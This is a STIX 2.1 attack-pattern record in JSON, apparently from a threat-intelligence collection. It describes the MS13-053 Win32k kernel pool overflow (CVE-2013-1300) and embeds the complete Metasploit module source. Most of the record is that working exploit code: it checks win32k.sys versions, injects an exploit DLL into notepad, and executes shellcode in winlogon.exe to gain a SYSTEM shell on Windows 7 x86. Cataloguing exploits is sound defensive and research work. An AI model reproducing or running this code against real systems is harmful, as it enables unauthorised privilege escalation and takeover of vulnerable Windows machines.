{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--96b84943-3655-4c30-a431-5bed9c9c5073",
    "created": "2024-08-14T16:49:13.514793Z",
    "modified": "2024-08-14T16:49:13.514797Z",
    "name": "Windows NTUserMessageCall Win32k Kernel Pool Overflow (Schlamperei)",
    "description": " This module leverages a kernel pool overflow in Win32k which allows local privilege escalation. The kernel shellcode nulls the ACL for the winlogon.exe process (a SYSTEM process). This allows any unprivileged process to freely migrate to winlogon.exe, achieving privilege escalation. This exploit was used in pwn2own 2013 by MWR to break out of chrome's sandbox. NOTE: when a meterpreter session started by this exploit exits, winlogin.exe is likely to crash.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms13_053_schlamperei.rb",
            "external_id": "ms13_053_schlamperei.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1300"
        },
        {
            "source_name": "reference",
            "url": "https://labs.mwrinfosecurity.com/blog/2013/09/06/mwr-labs-pwn2own-2013-write-up---kernel-exploit/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = AverageRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Windows NTUserMessageCall Win32k Kernel Pool Overflow (Schlamperei)',\n          'Description' => %q{\n            This module leverages a kernel pool overflow in Win32k which allows local privilege escalation.\n            The kernel shellcode nulls the ACL for the winlogon.exe process (a SYSTEM process).\n            This allows any unprivileged process to freely migrate to winlogon.exe, achieving\n            privilege escalation. This exploit was used in pwn2own 2013 by MWR to break out of chrome's sandbox.\n            NOTE: when a meterpreter session started by this exploit exits, winlogin.exe is likely to crash.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Nils', # Original Exploit\n            'Jon', # Original Exploit\n            'Donato Capitella <donato.capitella[at]mwrinfosecurity.com>', # Metasploit Conversion\n            'Ben Campbell <ben.campbell[at]mwrinfosecurity.com>' # Help and Encouragement ;)\n          ],\n          'Arch' => ARCH_X86,\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [ 'Windows 7 SP0/SP1', {} ]\n          ],\n          'Payload' => {\n            'Space' => 4096,\n            'DisableNops' => true\n          },\n          'References' => [\n            [ 'CVE', '2013-1300' ],\n            [ 'MSB', 'MS13-053' ],\n            [ 'URL', 'https://labs.mwrinfosecurity.com/blog/2013/09/06/mwr-labs-pwn2own-2013-write-up---kernel-exploit/' ]\n          ],\n          'DisclosureDate' => '2013-12-01',\n          'DefaultTarget' => 0,\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                stdapi_railgun_api\n                stdapi_sys_process_attach\n                stdapi_sys_process_get_processes\n                stdapi_sys_process_thread_create\n              ]\n            }\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    unless session.platform == 'windows'\n      return Exploit::CheckCode::Safe\n    end\n\n    file_path = expand_path('%windir%') << '\\\\system32\\\\win32k.sys'\n    major, minor, build, revision, branch = file_version(file_path)\n    vprint_status(\"win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}\")\n\n    case build\n    when 7600\n      return Exploit::CheckCode::Appears\n    when 7601\n      if branch == 18\n        return Exploit::CheckCode::Appears if revision < 18176\n      elsif revision < 22348\n        return Exploit::CheckCode::Appears\n      end\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64\n      fail_with(Failure::NoTarget, 'Running against 64-bit systems is not supported')\n    end\n\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system')\n    end\n\n    print_status('Launching notepad to host the exploit...')\n    notepad_process_pid = cmd_exec_get_pid('notepad.exe')\n    begin\n      process = client.sys.process.open(notepad_process_pid, PROCESS_ALL_ACCESS)\n      print_good(\"Process #{process.pid} launched.\")\n    rescue Rex::Post::Meterpreter::RequestError\n      print_error('Operation failed. Hosting exploit in the current process...')\n      process = client.sys.process.open\n    end\n\n    print_status(\"Reflectively injecting the exploit DLL into #{process.pid}...\")\n    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2013-1300', 'schlamperei.x86.dll')\n    library_path = ::File.expand_path(library_path)\n\n    print_status(\"Injecting exploit into #{process.pid}...\")\n    exploit_mem, offset = inject_dll_into_process(process, library_path)\n\n    thread = process.thread.create(exploit_mem + offset)\n    client.railgun.kernel32.WaitForSingleObject(thread.handle, 5000)\n\n    client.sys.process.each_process do |p|\n      next unless p['name'] == 'winlogon.exe'\n\n      winlogon_pid = p['pid']\n      print_status(\"Found winlogon.exe with PID #{winlogon_pid}\")\n\n      if execute_shellcode(payload.encoded, nil, winlogon_pid)\n        print_good('Everything seems to have worked, cross your fingers and wait for a SYSTEM shell')\n      else\n        print_error('Failed to start payload thread')\n      end\n\n      break\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-12-01",
    "x_mitre_platforms": [
        "win'"
    ]
}